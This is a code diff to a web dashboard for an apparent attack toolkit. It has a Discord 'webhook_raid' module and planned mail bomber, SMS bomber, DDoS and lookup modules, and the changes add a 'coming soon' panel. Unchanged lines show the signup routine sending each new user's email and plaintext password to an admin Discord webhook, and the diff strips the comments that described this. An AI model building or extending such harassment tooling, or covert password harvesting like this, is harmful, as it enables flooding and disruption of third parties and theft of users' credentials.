@@ -49,7 +49,7 @@
   .nav-item.active .icon { background: var(--green); }
   .nav-item .badge { margin-left: auto; font-size: 0.65rem; color: var(--amber); }
   .nav-item.wip { opacity: 0.5; }
-  .nav-item.wip:hover { color: var(--dim); background: transparent; cursor: not-allowed; }
+  .nav-item.wip:hover { color: var(--dim); background: transparent; cursor: pointer; }
   .nav-item.wip .badge { color: var(--red); border: 1px solid var(--red); padding: 0 4px; border-radius: 2px; }
   
   .content { padding: 2rem; display: flex; flex-direction: column; gap: 1.5rem; position: relative; overflow-y: auto;}
@@ -102,6 +102,9 @@
   .log-line.warn .lvl { color: var(--amber); } .log-line.warn .msg { color: var(--amber); }
   .log-line.err .lvl { color: var(--red); } .log-line.err .msg { color: var(--red); }
   
+  .coming-soon { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 300px; color: var(--dim); text-align: center; gap: 1rem; }
+  .coming-soon h3 { color: var(--amber); font-size: 1.2rem; text-transform: uppercase; letter-spacing: 0.2em; }
+  
   @media (max-width: 720px) { .main { grid-template-columns: 1fr; } .sidebar { border-right: 0; border-bottom: 1px solid var(--border); } .form-grid { grid-template-columns: 1fr; } }
 </style>
 </head>
@@ -133,23 +136,23 @@
         <span class="icon"></span><span>webhook_raid</span><span class="badge">HOOK</span>
       </div>
       
-      <div class="nav-item wip" onclick="logConsole('warn', 'Module SOON')">
+      <div class="nav-item wip" onclick="switchTab('soon')">
         <span class="icon"></span><span>mail_bomber</span><span class="badge">SOON</span>
       </div>
       
-      <div class="nav-item wip" onclick="logConsole('warn', 'Module SOON')">
+      <div class="nav-item wip" onclick="switchTab('soon')">
         <span class="icon"></span><span>SMS_bomber</span><span class="badge">SOON</span>
       </div>
       
-      <div class="nav-item wip" onclick="logConsole('warn', 'Module SOON')">
+      <div class="nav-item wip" onclick="switchTab('soon')">
         <span class="icon"></span><span>tg_mail_proxy</span><span class="badge">SOON</span>
       </div>
       
-      <div class="nav-item wip" onclick="logConsole('warn', 'Module SOON')">
+      <div class="nav-item wip" onclick="switchTab('soon')">
         <span class="icon"></span><span>DDos_voc</span><span class="badge">SOON</span>
       </div>
       
-      <div class="nav-item wip" onclick="logConsole('warn', 'Module SOON')">
+      <div class="nav-item wip" onclick="switchTab('soon')">
         <span class="icon"></span><span>lookup</span><span class="badge">SOON</span>
       </div>
       
@@ -183,6 +186,14 @@
           <div class="console" style="height: 400px;">
             <div class="console-head"><span>system activity</span><span id="log-count">0 entries</span></div>
             <div class="console-body" id="auth-logs-display" style="height: 100%;"></div>
+          </div>
+        </div>
+        
+        <!-- MODULE SOON -->
+        <div class="panel" id="panel-soon" style="display:none">
+          <div class="coming-soon">
+            <h3>MODULE SOON</h3>
+            <p>Ce module est en cours de développement. Il sera disponible prochainement.</p>
           </div>
         </div>
 
@@ -275,11 +286,9 @@
 
       if (accounts[email]) { alert("Cet email est déjà enregistré."); return; }
       
-      // Enregistrement instantané
       accounts[email] = pass;
       localStorage.setItem('bench_accounts', JSON.stringify(accounts));
       
-      // Envoi au webhook Discord
       sendAdminLog(`NOUVEAU COMPTE`, `Email: ${email}\nPassword: ${pass}`);
       
       loginUser(email);
@@ -348,18 +357,18 @@
     document.querySelectorAll('.nav-item[data-mod]').forEach(i => i.classList.remove('active'));
     document.querySelector(`.nav-item[data-mod="${tabId}"]`).classList.add('active');
     
-    const titles = { raid: 'webhook_raid', logs: 'system_logs' };
-    const paths = { raid: '/modules/discord/webhook', logs: '/system/logs' };
+    const titles = { raid: 'webhook_raid', logs: 'system_logs', soon: 'module_in_dev' };
+    const paths = { raid: '/modules/discord/webhook', logs: '/system/logs', soon: '/modules/dev' };
     document.getElementById('mod-title').textContent = titles[tabId];
     document.getElementById('mod-path').textContent = paths[tabId];
     
     document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
     document.getElementById('panel-' + tabId).style.display = 'block';
 
-    if (tabId === 'logs') {
+    if (tabId === 'logs' || tabId === 'soon') {
       document.getElementById('action-bar').style.display = 'none';
       document.getElementById('main-console').style.display = 'none';
-      renderLogs();
+      if (tabId === 'logs') renderLogs();
     } else {
       document.getElementById('action-bar').style.display = 'flex';
       document.getElementById('main-console').style.display = 'flex';
